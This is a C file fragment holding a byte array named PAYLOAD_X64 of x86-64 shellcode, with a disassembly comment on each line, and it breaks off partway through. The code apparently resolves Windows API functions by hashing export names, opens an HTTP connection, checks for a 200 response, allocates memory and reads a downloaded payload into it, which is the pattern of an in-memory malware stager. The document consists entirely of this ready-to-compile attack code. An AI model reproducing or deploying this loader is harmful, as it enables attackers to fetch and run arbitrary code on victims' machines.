
// Target architecture : X86 64

char PAYLOAD_X64[] = {
  /* 0000 */ "\x48\x89\x5c\x24\x08"                     /* mov       qword ptr [rsp + 8], rbx             */
  /* 0005 */ "\x48\x89\x74\x24\x10"                     /* mov       qword ptr [rsp + 0x10], rsi          */
  /* 000A */ "\x57"                                     /* push      rdi                                  */
  /* 000B */ "\x48\x83\xec\x60"                         /* sub       rsp, 0x60                            */
  /* 000F */ "\x44\x8b\x09"                             /* mov       r9d, dword ptr [rcx]                 */
  /* 0012 */ "\x48\x8d\x71\x24"                         /* lea       rsi, qword ptr [rcx + 0x24]          */
  /* 0016 */ "\x48\x8b\xf9"                             /* mov       rdi, rcx                             */
  /* 0019 */ "\x48\x8d\x51\x14"                         /* lea       rdx, qword ptr [rcx + 0x14]          */
  /* 001D */ "\x41\x83\xe9\x24"                         /* sub       r9d, 0x24                            */
  /* 0021 */ "\x4c\x8b\xc6"                             /* mov       r8, rsi                              */
  /* 0024 */ "\x48\x83\xc1\x04"                         /* add       rcx, 4                               */
  /* 0028 */ "\xe8\x8f\x0a\x00\x00"                     /* call      0xabc                                */
  /* 002D */ "\x48\x8b\x97\x28\x01\x00\x00"             /* mov       rdx, qword ptr [rdi + 0x128]         */
  /* 0034 */ "\x48\x8d\x8f\xac\x03\x00\x00"             /* lea       rcx, qword ptr [rdi + 0x3ac]         */
  /* 003B */ "\xe8\x38\x09\x00\x00"                     /* call      0x978                                */
  /* 0040 */ "\x48\x3b\x87\xd0\x03\x00\x00"             /* cmp       rax, qword ptr [rdi + 0x3d0]         */
  /* 0047 */ "\x0f\x85\xc0\x00\x00\x00"                 /* jne       0x10d                                */
  /* 004D */ "\x48\x8b\x97\x28\x01\x00\x00"             /* mov       rdx, qword ptr [rdi + 0x128]         */
  /* 0054 */ "\x48\x8b\x8f\x38\x01\x00\x00"             /* mov       rcx, qword ptr [rdi + 0x138]         */
  /* 005B */ "\xe8\xb8\x08\x00\x00"                     /* call      0x918                                */
  /* 0060 */ "\x48\x89\x87\x38\x01\x00\x00"             /* mov       qword ptr [rdi + 0x138], rax         */
  /* 0067 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 006A */ "\x0f\x84\x9d\x00\x00\x00"                 /* je        0x10d                                */
  /* 0070 */ "\x33\xdb"                                 /* xor       ebx, ebx                             */
  /* 0072 */ "\x39\x1e"                                 /* cmp       dword ptr [rsi], ebx                 */
  /* 0074 */ "\x76\x19"                                 /* jbe       0x8f                                 */
  /* 0076 */ "\x8b\xc3"                                 /* mov       eax, ebx                             */
  /* 0078 */ "\x48\x8d\x4f\x28"                         /* lea       rcx, qword ptr [rdi + 0x28]          */
  /* 007C */ "\x48\xc1\xe0\x05"                         /* shl       rax, 5                               */
  /* 0080 */ "\x48\x03\xc8"                             /* add       rcx, rax                             */
  /* 0083 */ "\xff\x97\x38\x01\x00\x00"                 /* call      qword ptr [rdi + 0x138]              */
  /* 0089 */ "\xff\xc3"                                 /* inc       ebx                                  */
  /* 008B */ "\x3b\x1e"                                 /* cmp       ebx, dword ptr [rsi]                 */
  /* 008D */ "\x72\xe7"                                 /* jb        0x76                                 */
  /* 008F */ "\xbe\x01\x00\x00\x00"                     /* mov       esi, 1                               */
  /* 0094 */ "\x39\xb7\x30\x01\x00\x00"                 /* cmp       dword ptr [rdi + 0x130], esi         */
  /* 009A */ "\x76\x2d"                                 /* jbe       0xc9                                 */
  /* 009C */ "\x48\x8b\x97\x28\x01\x00\x00"             /* mov       rdx, qword ptr [rdi + 0x128]         */
  /* 00A3 */ "\x8b\xde"                                 /* mov       ebx, esi                             */
  /* 00A5 */ "\x48\x8b\x8c\xdf\x38\x01\x00\x00"         /* mov       rcx, qword ptr [rdi + rbx*8 + 0x138] */
  /* 00AD */ "\xe8\x66\x08\x00\x00"                     /* call      0x918                                */
  /* 00B2 */ "\x48\x89\x84\xdf\x38\x01\x00\x00"         /* mov       qword ptr [rdi + rbx*8 + 0x138], rax */
  /* 00BA */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 00BD */ "\x74\x4e"                                 /* je        0x10d                                */
  /* 00BF */ "\xff\xc6"                                 /* inc       esi                                  */
  /* 00C1 */ "\x3b\xb7\x30\x01\x00\x00"                 /* cmp       esi, dword ptr [rdi + 0x130]         */
  /* 00C7 */ "\x72\xd3"                                 /* jb        0x9c                                 */
  /* 00C9 */ "\x83\xbf\x18\x03\x00\x00\x01"             /* cmp       dword ptr [rdi + 0x318], 1           */
  /* 00D0 */ "\x75\x0c"                                 /* jne       0xde                                 */
  /* 00D2 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 00D5 */ "\xe8\x46\x00\x00\x00"                     /* call      0x120                                */
  /* 00DA */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 00DC */ "\x74\x2f"                                 /* je        0x10d                                */
  /* 00DE */ "\x48\x8d\x54\x24\x20"                     /* lea       rdx, qword ptr [rsp + 0x20]          */
  /* 00E3 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 00E6 */ "\xe8\xa9\x04\x00\x00"                     /* call      0x594                                */
  /* 00EB */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 00ED */ "\x74\x0d"                                 /* je        0xfc                                 */
  /* 00EF */ "\x48\x8d\x54\x24\x20"                     /* lea       rdx, qword ptr [rsp + 0x20]          */
  /* 00F4 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 00F7 */ "\xe8\x68\x06\x00\x00"                     /* call      0x764                                */
  /* 00FC */ "\x48\x8d\x54\x24\x20"                     /* lea       rdx, qword ptr [rsp + 0x20]          */
  /* 0101 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 0104 */ "\xe8\xaf\x03\x00\x00"                     /* call      0x4b8                                */
  /* 0109 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 010B */ "\xeb\x03"                                 /* jmp       0x110                                */
  /* 010D */ "\x83\xc8\xff"                             /* or        eax, 0xffffffff                      */
  /* 0110 */ "\x48\x8b\x5c\x24\x70"                     /* mov       rbx, qword ptr [rsp + 0x70]          */
  /* 0115 */ "\x48\x8b\x74\x24\x78"                     /* mov       rsi, qword ptr [rsp + 0x78]          */
  /* 011A */ "\x48\x83\xc4\x60"                         /* add       rsp, 0x60                            */
  /* 011E */ "\x5f"                                     /* pop       rdi                                  */
  /* 011F */ "\xc3"                                     /* ret                                            */
  /* 0120 */ "\x40\x55"                                 /* push      rbp                                  */
  /* 0122 */ "\x53"                                     /* push      rbx                                  */
  /* 0123 */ "\x56"                                     /* push      rsi                                  */
  /* 0124 */ "\x57"                                     /* push      rdi                                  */
  /* 0125 */ "\x41\x54"                                 /* push      r12                                  */
  /* 0127 */ "\x41\x55"                                 /* push      r13                                  */
  /* 0129 */ "\x41\x56"                                 /* push      r14                                  */
  /* 012B */ "\x41\x57"                                 /* push      r15                                  */
  /* 012D */ "\x48\x8d\xac\x24\x48\xff\xff\xff"         /* lea       rbp, qword ptr [rsp - 0xb8]          */
  /* 0135 */ "\x48\x81\xec\xb8\x01\x00\x00"             /* sub       rsp, 0x1b8                           */
  /* 013C */ "\x83\xa5\x08\x01\x00\x00\x00"             /* and       dword ptr [rbp + 0x108], 0           */
  /* 0143 */ "\x48\x8d\x7c\x24\x40"                     /* lea       rdi, qword ptr [rsp + 0x40]          */
  /* 0148 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 014A */ "\x4c\x8d\x4c\x24\x40"                     /* lea       r9, qword ptr [rsp + 0x40]           */
  /* 014F */ "\x48\x8b\xd9"                             /* mov       rbx, rcx                             */
  /* 0152 */ "\x41\xb8\x00\x00\x00\x10"                 /* mov       r8d, 0x10000000                      */
  /* 0158 */ "\x45\x33\xf6"                             /* xor       r14d, r14d                           */
  /* 015B */ "\xbe\x00\x02\x60\x84"                     /* mov       esi, 0x84600200                      */
  /* 0160 */ "\x8d\x50\x68"                             /* lea       edx, dword ptr [rax + 0x68]          */
  /* 0163 */ "\x8b\xca"                                 /* mov       ecx, edx                             */
  /* 0165 */ "\xf3\xaa"                                 /* rep stosb byte ptr [rdi], al                   */
  /* 0167 */ "\x48\x8d\x45\xb0"                         /* lea       rax, qword ptr [rbp - 0x50]          */
  /* 016B */ "\x89\x54\x24\x40"                         /* mov       dword ptr [rsp + 0x40], edx          */
  /* 016F */ "\x48\x89\x44\x24\x58"                     /* mov       qword ptr [rsp + 0x58], rax          */
  /* 0174 */ "\x48\x8d\x8b\x1c\x03\x00\x00"             /* lea       rcx, qword ptr [rbx + 0x31c]         */
  /* 017B */ "\x48\x8d\x45\x30"                         /* lea       rax, qword ptr [rbp + 0x30]          */
  /* 017F */ "\x48\x89\x45\x88"                         /* mov       qword ptr [rbp - 0x78], rax          */
  /* 0183 */ "\x8d\x42\x18"                             /* lea       eax, dword ptr [rdx + 0x18]          */
  /* 0186 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 0188 */ "\x89\x44\x24\x60"                         /* mov       dword ptr [rsp + 0x60], eax          */
  /* 018C */ "\x89\x45\x90"                             /* mov       dword ptr [rbp - 0x70], eax          */
  /* 018F */ "\xff\x93\x88\x01\x00\x00"                 /* call      qword ptr [rbx + 0x188]              */
  /* 0195 */ "\x33\xff"                                 /* xor       edi, edi                             */
  /* 0197 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0199 */ "\x0f\x84\x1d\x02\x00\x00"                 /* je        0x3bc                                */
  /* 019F */ "\x83\x7c\x24\x54\x04"                     /* cmp       dword ptr [rsp + 0x54], 4            */
  /* 01A4 */ "\xb8\x00\x32\xe0\x84"                     /* mov       eax, 0x84e03200                      */
  /* 01A9 */ "\x44\x8b\xff"                             /* mov       r15d, edi                            */
  /* 01AC */ "\x89\x7c\x24\x20"                         /* mov       dword ptr [rsp + 0x20], edi          */
  /* 01B0 */ "\x41\x0f\x94\xc7"                         /* sete      r15b                                 */
  /* 01B4 */ "\x0f\x44\xf0"                             /* cmove     esi, eax                             */
  /* 01B7 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 01BA */ "\x45\x33\xc0"                             /* xor       r8d, r8d                             */
  /* 01BD */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 01BF */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 01C1 */ "\xff\x93\x90\x01\x00\x00"                 /* call      qword ptr [rbx + 0x190]              */
  /* 01C7 */ "\x4c\x8b\xe8"                             /* mov       r13, rax                             */
  /* 01CA */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 01CD */ "\x0f\x84\xe9\x01\x00\x00"                 /* je        0x3bc                                */
  /* 01D3 */ "\x48\x89\x7c\x24\x38"                     /* mov       qword ptr [rsp + 0x38], rdi          */
  /* 01D8 */ "\x48\x8d\x55\xb0"                         /* lea       rdx, qword ptr [rbp - 0x50]          */
  /* 01DC */ "\x41\x8b\xcf"                             /* mov       ecx, r15d                            */
  /* 01DF */ "\x89\x7c\x24\x30"                         /* mov       dword ptr [rsp + 0x30], edi          */
  /* 01E3 */ "\xf7\xd9"                                 /* neg       ecx                                  */
  /* 01E5 */ "\xc7\x44\x24\x28\x03\x00\x00\x00"         /* mov       dword ptr [rsp + 0x28], 3            */
  /* 01ED */ "\x48\x8b\xc8"                             /* mov       rcx, rax                             */
  /* 01F0 */ "\x48\x89\x7c\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rdi          */
  /* 01F5 */ "\x66\x45\x1b\xc0"                         /* sbb       r8w, r8w                             */
  /* 01F9 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 01FC */ "\x66\x41\x81\xe0\x6b\x01"                 /* and       r8w, 0x16b                           */
  /* 0202 */ "\x66\x41\x83\xc0\x50"                     /* add       r8w, 0x50                            */
  /* 0207 */ "\xff\x93\x98\x01\x00\x00"                 /* call      qword ptr [rbx + 0x198]              */
  /* 020D */ "\x4c\x8b\xe0"                             /* mov       r12, rax                             */
  /* 0210 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0213 */ "\x0f\x84\x50\x01\x00\x00"                 /* je        0x369                                */
  /* 0219 */ "\x48\x89\x7c\x24\x38"                     /* mov       qword ptr [rsp + 0x38], rdi          */
  /* 021E */ "\x48\x8d\x93\x9c\x03\x00\x00"             /* lea       rdx, qword ptr [rbx + 0x39c]         */
  /* 0225 */ "\x89\x74\x24\x30"                         /* mov       dword ptr [rsp + 0x30], esi          */
  /* 0229 */ "\x4c\x8d\x45\x30"                         /* lea       r8, qword ptr [rbp + 0x30]           */
  /* 022D */ "\x48\x89\x7c\x24\x28"                     /* mov       qword ptr [rsp + 0x28], rdi          */
  /* 0232 */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 0235 */ "\x48\x8b\xc8"                             /* mov       rcx, rax                             */
  /* 0238 */ "\x48\x89\x7c\x24\x20"                     /* mov       qword ptr [rsp + 0x20], rdi          */
  /* 023D */ "\xff\x93\xb8\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1b8]              */
  /* 0243 */ "\x48\x8b\xf8"                             /* mov       rdi, rax                             */
  /* 0246 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0249 */ "\x0f\x84\x11\x01\x00\x00"                 /* je        0x360                                */
  /* 024F */ "\x45\x85\xff"                             /* test      r15d, r15d                           */
  /* 0252 */ "\x74\x28"                                 /* je        0x27c                                */
  /* 0254 */ "\x0f\xba\xe6\x0c"                         /* bt        esi, 0xc                             */
  /* 0258 */ "\x73\x22"                                 /* jae       0x27c                                */
  /* 025A */ "\x45\x8d\x4e\x04"                         /* lea       r9d, dword ptr [r14 + 4]             */
  /* 025E */ "\xc7\x85\x10\x01\x00\x00\x80\x33\x00\x00" /* mov       dword ptr [rbp + 0x110], 0x3380      */
  /* 0268 */ "\x4c\x8d\x85\x10\x01\x00\x00"             /* lea       r8, qword ptr [rbp + 0x110]          */
  /* 026F */ "\x48\x8b\xc8"                             /* mov       rcx, rax                             */
  /* 0272 */ "\x41\x8d\x56\x1f"                         /* lea       edx, dword ptr [r14 + 0x1f]          */
  /* 0276 */ "\xff\x93\xa0\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1a0]              */
  /* 027C */ "\x45\x33\xff"                             /* xor       r15d, r15d                           */
  /* 027F */ "\x45\x33\xc9"                             /* xor       r9d, r9d                             */
  /* 0282 */ "\x45\x33\xc0"                             /* xor       r8d, r8d                             */
  /* 0285 */ "\x44\x89\x7c\x24\x20"                     /* mov       dword ptr [rsp + 0x20], r15d         */
  /* 028A */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 028C */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 028F */ "\xff\x93\xc0\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1c0]              */
  /* 0295 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 0297 */ "\x0f\x84\xba\x00\x00\x00"                 /* je        0x357                                */
  /* 029D */ "\x4c\x8d\x8d\x00\x01\x00\x00"             /* lea       r9, qword ptr [rbp + 0x100]          */
  /* 02A4 */ "\xc7\x85\x00\x01\x00\x00\x04\x00\x00\x00" /* mov       dword ptr [rbp + 0x100], 4           */
  /* 02AE */ "\x4c\x8d\x85\x08\x01\x00\x00"             /* lea       r8, qword ptr [rbp + 0x108]          */
  /* 02B5 */ "\x4c\x89\x7c\x24\x20"                     /* mov       qword ptr [rsp + 0x20], r15          */
  /* 02BA */ "\xba\x13\x00\x00\x20"                     /* mov       edx, 0x20000013                      */
  /* 02BF */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 02C2 */ "\xff\x93\xc8\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1c8]              */
  /* 02C8 */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 02CA */ "\x0f\x84\x87\x00\x00\x00"                 /* je        0x357                                */
  /* 02D0 */ "\x81\xbd\x08\x01\x00\x00\xc8\x00\x00\x00" /* cmp       dword ptr [rbp + 0x108], 0xc8        */
  /* 02DA */ "\x75\x7b"                                 /* jne       0x357                                */
  /* 02DC */ "\x48\x8d\xb3\xf8\x03\x00\x00"             /* lea       rsi, qword ptr [rbx + 0x3f8]         */
  /* 02E3 */ "\xc7\x85\x00\x01\x00\x00\x08\x00\x00\x00" /* mov       dword ptr [rbp + 0x100], 8           */
  /* 02ED */ "\x4c\x8b\xc6"                             /* mov       r8, rsi                              */
  /* 02F0 */ "\x4c\x89\x3e"                             /* mov       qword ptr [rsi], r15                 */
  /* 02F3 */ "\x4c\x8d\x8d\x00\x01\x00\x00"             /* lea       r9, qword ptr [rbp + 0x100]          */
  /* 02FA */ "\x4c\x89\x7c\x24\x20"                     /* mov       qword ptr [rsp + 0x20], r15          */
  /* 02FF */ "\xba\x05\x00\x00\x20"                     /* mov       edx, 0x20000005                      */
  /* 0304 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 0307 */ "\xff\x93\xc8\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1c8]              */
  /* 030D */ "\x85\xc0"                                 /* test      eax, eax                             */
  /* 030F */ "\x74\x46"                                 /* je        0x357                                */
  /* 0311 */ "\x48\x8b\x16"                             /* mov       rdx, qword ptr [rsi]                 */
  /* 0314 */ "\x48\x85\xd2"                             /* test      rdx, rdx                             */
  /* 0317 */ "\x74\x3e"                                 /* je        0x357                                */
  /* 0319 */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 031B */ "\x45\x8d\x4f\x04"                         /* lea       r9d, dword ptr [r15 + 4]             */
  /* 031F */ "\x41\xb8\x00\x30\x00\x00"                 /* mov       r8d, 0x3000                          */
  /* 0325 */ "\xff\x93\x40\x01\x00\x00"                 /* call      qword ptr [rbx + 0x140]              */
  /* 032B */ "\x48\x89\x83\x00\x04\x00\x00"             /* mov       qword ptr [rbx + 0x400], rax         */
  /* 0332 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 0335 */ "\x74\x20"                                 /* je        0x357                                */
  /* 0337 */ "\x44\x8b\x06"                             /* mov       r8d, dword ptr [rsi]                 */
  /* 033A */ "\x4c\x8d\x8d\x18\x01\x00\x00"             /* lea       r9, qword ptr [rbp + 0x118]          */
  /* 0341 */ "\x48\x8b\xd0"                             /* mov       rdx, rax                             */
  /* 0344 */ "\x44\x89\xbd\x18\x01\x00\x00"             /* mov       dword ptr [rbp + 0x118], r15d        */
  /* 034B */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 034E */ "\xff\x93\xa8\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1a8]              */
  /* 0354 */ "\x44\x8b\xf0"                             /* mov       r14d, eax                            */
  /* 0357 */ "\x48\x8b\xcf"                             /* mov       rcx, rdi                             */
  /* 035A */ "\xff\x93\xb0\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1b0]              */
  /* 0360 */ "\x49\x8b\xcc"                             /* mov       rcx, r12                             */
  /* 0363 */ "\xff\x93\xb0\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1b0]              */
  /* 0369 */ "\x49\x8b\xcd"                             /* mov       rcx, r13                             */
  /* 036C */ "\xff\x93\xb0\x01\x00\x00"                 /* call      qword ptr [rbx + 0x1b0]              */
  /* 0372 */ "\x45\x85\xf6"                             /* test      r14d, r14d                           */
  /* 0375 */ "\x74\x40"                                 /* je        0x3b7                                */
  /* 0377 */ "\x48\x8b\xbb\x00\x04\x00\x00"             /* mov       rdi, qword ptr [rbx + 0x400]         */
  /* 037E */ "\x48\x8d\x93\xe8\x03\x00\x00"             /* lea       rdx, qword ptr [rbx + 0x3e8]         */
  /* 0385 */ "\x4c\x8b\x8b\xf8\x03\x00\x00"             /* mov       r9, qword ptr [rbx + 0x3f8]          */
  /* 038C */ "\x48\x8d\x8b\xd8\x03\x00\x00"             /* lea       rcx, qword ptr [rbx + 0x3d8]         */
  /* 0393 */ "\x4c\x8b\xc7"                             /* mov       r8, rdi                              */
  /* 0396 */ "\xe8\x21\x07\x00\x00"                     /* call      0xabc                                */
  /* 039B */ "\x48\x8b\x93\x28\x01\x00\x00"             /* mov       rdx, qword ptr [rbx + 0x128]         */
  /* 03A2 */ "\x48\x8d\x8b\xac\x03\x00\x00"             /* lea       rcx, qword ptr [rbx + 0x3ac]         */
  /* 03A9 */ "\xe8\xca\x05\x00\x00"                     /* call      0x978                                */
  /* 03AE */ "\x48\x3b\x87\x28\x03\x00\x00"             /* cmp       rax, qword ptr [rdi + 0x328]         */
  /* 03B5 */ "\x75\x05"                                 /* jne       0x3bc                                */
  /* 03B7 */ "\x41\x8b\xc6"                             /* mov       eax, r14d                            */
  /* 03BA */ "\xeb\x02"                                 /* jmp       0x3be                                */
  /* 03BC */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 03BE */ "\x48\x81\xc4\xb8\x01\x00\x00"             /* add       rsp, 0x1b8                           */
  /* 03C5 */ "\x41\x5f"                                 /* pop       r15                                  */
  /* 03C7 */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 03C9 */ "\x41\x5d"                                 /* pop       r13                                  */
  /* 03CB */ "\x41\x5c"                                 /* pop       r12                                  */
  /* 03CD */ "\x5f"                                     /* pop       rdi                                  */
  /* 03CE */ "\x5e"                                     /* pop       rsi                                  */
  /* 03CF */ "\x5b"                                     /* pop       rbx                                  */
  /* 03D0 */ "\x5d"                                     /* pop       rbp                                  */
  /* 03D1 */ "\xc3"                                     /* ret                                            */
  /* 03D2 */ "\xcc"                                     /* int3                                           */
  /* 03D3 */ "\xcc"                                     /* int3                                           */
  /* 03D4 */ "\x48\x8b\xc4"                             /* mov       rax, rsp                             */
  /* 03D7 */ "\x48\x89\x58\x08"                         /* mov       qword ptr [rax + 8], rbx             */
  /* 03DB */ "\x48\x89\x68\x18"                         /* mov       qword ptr [rax + 0x18], rbp          */
  /* 03DF */ "\x48\x89\x70\x20"                         /* mov       qword ptr [rax + 0x20], rsi          */
  /* 03E3 */ "\x48\x89\x50\x10"                         /* mov       qword ptr [rax + 0x10], rdx          */
  /* 03E7 */ "\x57"                                     /* push      rdi                                  */
  /* 03E8 */ "\x41\x54"                                 /* push      r12                                  */
  /* 03EA */ "\x41\x55"                                 /* push      r13                                  */
  /* 03EC */ "\x41\x56"                                 /* push      r14                                  */
  /* 03EE */ "\x41\x57"                                 /* push      r15                                  */
  /* 03F0 */ "\x48\x81\xec\x30\x01\x00\x00"             /* sub       rsp, 0x130                           */
  /* 03F7 */ "\x48\x63\x41\x3c"                         /* movsxd    rax, dword ptr [rcx + 0x3c]          */
  /* 03FB */ "\x48\x8b\xd9"                             /* mov       rbx, rcx                             */
  /* 03FE */ "\x4d\x8b\xf8"                             /* mov       r15, r8                              */
  /* 0401 */ "\x8b\x8c\x08\x88\x00\x00\x00"             /* mov       ecx, dword ptr [rax + rcx + 0x88]    */
  /* 0408 */ "\x85\xc9"                                 /* test      ecx, ecx                             */
  /* 040A */ "\x74\x7b"                                 /* je        0x487                                */
  /* 040C */ "\x48\x8d\x04\x0b"                         /* lea       rax, qword ptr [rbx + rcx]           */
  /* 0410 */ "\x8b\x78\x18"                             /* mov       edi, dword ptr [rax + 0x18]          */
  /* 0413 */ "\x85\xff"                                 /* test      edi, edi                             */
  /* 0415 */ "\x74\x70"                                 /* je        0x487                                */
  /* 0417 */ "\x8b\x68\x1c"                             /* mov       ebp, dword ptr [rax + 0x1c]          */
  /* 041A */ "\x33\xc9"                                 /* xor       ecx, ecx                             */
  /* 041C */ "\x44\x8b\x68\x20"                         /* mov       r13d, dword ptr [rax + 0x20]         */
  /* 0420 */ "\x48\x03\xeb"                             /* add       rbp, rbx                             */
  /* 0423 */ "\x44\x8b\x70\x24"                         /* mov       r14d, dword ptr [rax + 0x24]         */
  /* 0427 */ "\x4c\x03\xeb"                             /* add       r13, rbx                             */
  /* 042A */ "\x8b\x40\x0c"                             /* mov       eax, dword ptr [rax + 0xc]           */
  /* 042D */ "\x4c\x03\xf3"                             /* add       r14, rbx                             */
  /* 0430 */ "\x4c\x8d\x04\x18"                         /* lea       r8, qword ptr [rax + rbx]            */
  /* 0434 */ "\x41\x8a\x00"                             /* mov       al, byte ptr [r8]                    */
  /* 0437 */ "\x84\xc0"                                 /* test      al, al                               */
  /* 0439 */ "\x74\x14"                                 /* je        0x44f                                */
  /* 043B */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 043D */ "\xff\xc1"                                 /* inc       ecx                                  */
  /* 043F */ "\x0c\x20"                                 /* or        al, 0x20                             */
  /* 0441 */ "\x88\x44\x14\x20"                         /* mov       byte ptr [rsp + rdx + 0x20], al      */
  /* 0445 */ "\x8b\xd1"                                 /* mov       edx, ecx                             */
  /* 0447 */ "\x42\x8a\x04\x01"                         /* mov       al, byte ptr [rcx + r8]              */
  /* 044B */ "\x84\xc0"                                 /* test      al, al                               */
  /* 044D */ "\x75\xee"                                 /* jne       0x43d                                */
  /* 044F */ "\xc6\x44\x0c\x20\x00"                     /* mov       byte ptr [rsp + rcx + 0x20], 0       */
  /* 0454 */ "\x49\x8b\xd7"                             /* mov       rdx, r15                             */
  /* 0457 */ "\x48\x8d\x4c\x24\x20"                     /* lea       rcx, qword ptr [rsp + 0x20]          */
  /* 045C */ "\xe8\x17\x05\x00\x00"                     /* call      0x978                                */
  /* 0461 */ "\x4c\x8b\xe0"                             /* mov       r12, rax                             */
  /* 0464 */ "\xff\xcf"                                 /* dec       edi                                  */
  /* 0466 */ "\x49\x8b\xd7"                             /* mov       rdx, r15                             */
  /* 0469 */ "\x41\x8b\x4c\xbd\x00"                     /* mov       ecx, dword ptr [r13 + rdi*4]         */
  /* 046E */ "\x48\x03\xcb"                             /* add       rcx, rbx                             */
  /* 0471 */ "\xe8\x02\x05\x00\x00"                     /* call      0x978                                */
  /* 0476 */ "\x49\x33\xc4"                             /* xor       rax, r12                             */
  /* 0479 */ "\x48\x3b\x84\x24\x68\x01\x00\x00"         /* cmp       rax, qword ptr [rsp + 0x168]         */
  /* 0481 */ "\x74\x27"                                 /* je        0x4aa                                */
  /* 0483 */ "\x85\xff"                                 /* test      edi, edi                             */
  /* 0485 */ "\x75\xdd"                                 /* jne       0x464                                */
  /* 0487 */ "\x33\xc0"                                 /* xor       eax, eax                             */
  /* 0489 */ "\x4c\x8d\x9c\x24\x30\x01\x00\x00"         /* lea       r11, qword ptr [rsp + 0x130]         */
  /* 0491 */ "\x49\x8b\x5b\x30"                         /* mov       rbx, qword ptr [r11 + 0x30]          */
  /* 0495 */ "\x49\x8b\x6b\x40"                         /* mov       rbp, qword ptr [r11 + 0x40]          */
  /* 0499 */ "\x49\x8b\x73\x48"                         /* mov       rsi, qword ptr [r11 + 0x48]          */
  /* 049D */ "\x49\x8b\xe3"                             /* mov       rsp, r11                             */
  /* 04A0 */ "\x41\x5f"                                 /* pop       r15                                  */
  /* 04A2 */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 04A4 */ "\x41\x5d"                                 /* pop       r13                                  */
  /* 04A6 */ "\x41\x5c"                                 /* pop       r12                                  */
  /* 04A8 */ "\x5f"                                     /* pop       rdi                                  */
  /* 04A9 */ "\xc3"                                     /* ret                                            */
  /* 04AA */ "\x41\x0f\xb7\x04\x7e"                     /* movzx     eax, word ptr [r14 + rdi*2]          */
  /* 04AF */ "\x8b\x44\x85\x00"                         /* mov       eax, dword ptr [rbp + rax*4]         */
  /* 04B3 */ "\x48\x03\xc3"                             /* add       rax, rbx                             */
  /* 04B6 */ "\xeb\xd1"                                 /* jmp       0x489                                */
  /* 04B8 */ "\x48\x89\x5c\x24\x08"                     /* mov       qword ptr [rsp + 8], rbx             */
  /* 04BD */ "\x57"                                     /* push      rdi                                  */
  /* 04BE */ "\x48\x83\xec\x20"                         /* sub       rsp, 0x20                            */
  /* 04C2 */ "\x83\xb9\x18\x03\x00\x00\x01"             /* cmp       dword ptr [rcx + 0x318], 1           */
  /* 04C9 */ "\x48\x8b\xda"                             /* mov       rbx, rdx                             */
  /* 04CC */ "\x48\x8b\xf9"                             /* mov       rdi, rcx                             */
  /* 04CF */ "\x75\x22"                                 /* jne       0x4f3                                */
  /* 04D1 */ "\x48\x8b\x89\x00\x04\x00\x00"             /* mov       rcx, qword ptr [rcx + 0x400]         */
  /* 04D8 */ "\x48\x85\xc9"                             /* test      rcx, rcx                             */
  /* 04DB */ "\x74\x16"                                 /* je        0x4f3                                */
  /* 04DD */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 04DF */ "\x41\xb8\x00\xc0\x00\x00"                 /* mov       r8d, 0xc000                          */
  /* 04E5 */ "\xff\x97\x48\x01\x00\x00"                 /* call      qword ptr [rdi + 0x148]              */
  /* 04EB */ "\x48\x83\xa7\x00\x04\x00\x00\x00"         /* and       qword ptr [rdi + 0x400], 0           */
  /* 04F3 */ "\x48\x8b\x4b\x30"                         /* mov       rcx, qword ptr [rbx + 0x30]          */
  /* 04F7 */ "\x48\x85\xc9"                             /* test      rcx, rcx                             */
  /* 04FA */ "\x74\x0b"                                 /* je        0x507                                */
  /* 04FC */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
  /* 04FF */ "\xff\x50\x10"                             /* call      qword ptr [rax + 0x10]               */
  /* 0502 */ "\x48\x83\x63\x30\x00"                     /* and       qword ptr [rbx + 0x30], 0            */
  /* 0507 */ "\x48\x8b\x4b\x28"                         /* mov       rcx, qword ptr [rbx + 0x28]          */
  /* 050B */ "\x48\x85\xc9"                             /* test      rcx, rcx                             */
  /* 050E */ "\x74\x0b"                                 /* je        0x51b                                */
  /* 0510 */ "\x48\x8b\x01"                             /* mov       rax, qword ptr [rcx]                 */
